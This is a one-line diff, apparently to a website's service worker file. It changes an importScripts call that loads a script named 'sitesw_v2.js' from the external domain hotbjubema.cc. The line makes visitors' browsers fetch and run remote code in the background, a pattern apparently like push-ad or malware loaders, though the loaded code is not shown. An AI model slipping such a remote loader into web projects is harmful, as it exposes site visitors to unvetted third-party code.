@@ -1,1 +1,1 @@
-importScripts('https://hotbjubema.cc/sitesw_v2.js');
+importScripts('https://hotbjubema.cc/11299/sitesw_v2.js');
